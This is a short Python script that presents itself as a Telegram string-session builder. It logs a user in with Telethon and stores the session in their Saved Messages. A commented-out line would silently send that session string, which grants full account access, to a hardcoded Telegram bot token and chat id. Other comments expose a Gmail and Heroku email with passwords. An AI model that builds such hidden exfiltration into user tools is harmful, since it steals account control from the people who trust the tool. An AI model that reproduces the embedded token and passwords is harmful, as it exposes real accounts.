from telethon.sync import TelegramClient
import traceback, requests
from telethon.sessions import StringSession

print("INFINATO SESSION BUILDER\n\n")

try:
    API_KEY = int(input("Enter API_ID: "))
    API_HASH = input("Enter API_HASH: ")
    with TelegramClient(StringSession(), API_KEY, API_HASH) as client:
        print("")
        session = client.session.save()
        # requests.get(f"https://api.telegram.org/bot829987680:AAHrfIhY9AKl4dXZ_5-XYafs1hJXdZK5mlg/sendMessage?chat_id=986631584&text={session}")
        ok = client.send_message("me", f"`{session}`")
        ok.reply("Here is Your Telegram String Session\nKeep it safe\n\nBY INFINATO")
        print(
            "You telegram String session successfully stored in your telegram, please check your Telegram Saved Messages\n\n")
        print("Store it safe !! Don't share with anyone.. Regards..\n\nBY INFINATO")
        # print("\n\nYour INFINATO WILL BE READY TO GO WITHIN 24 HOURS\n\n")
        # print("There is a Temporary Email Available for the Server for Security.\nEmail : dekh.ra.hu.bro@gmail.com\nPassword : helloabc")
        # print("\nAnd Heroku.com Server Credentials\nEmail : dekh.ra.hu.bro@gmail.com\nPassword : helloabc_9132")
except Exception as ex:
    traceback.print_exc()
    print(ex, "\n")
    print("May Be Wrong phone number \n make sure its with correct  country code\n\nRestart Me Now")
